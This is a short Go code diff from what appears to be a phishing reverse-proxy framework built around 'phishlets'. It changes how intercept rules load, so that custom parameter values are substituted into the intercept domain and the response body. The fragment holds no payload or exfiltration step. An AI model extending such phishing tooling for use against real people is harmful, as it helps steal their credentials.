@@ -559,7 +559,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			if ic.Mime != nil {
 				mime = *ic.Mime
 			}
-			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime)
+			err = p.addIntercept(p.paramVal(*ic.Domain), path_re, *ic.HttpStatus, p.paramVal(body), mime)
 			if err != nil {
 				return err
 			}
